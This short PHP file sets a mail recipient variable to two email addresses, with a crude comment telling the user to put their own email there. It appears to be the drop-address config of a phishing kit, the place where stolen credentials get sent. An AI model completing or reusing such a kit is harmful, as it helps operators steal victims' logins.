<?php

$to = "credibiltynick@gmail.com,big.rashid2018@yandex.com"; // PUT UR FUCKING E-MAIL BRO

?>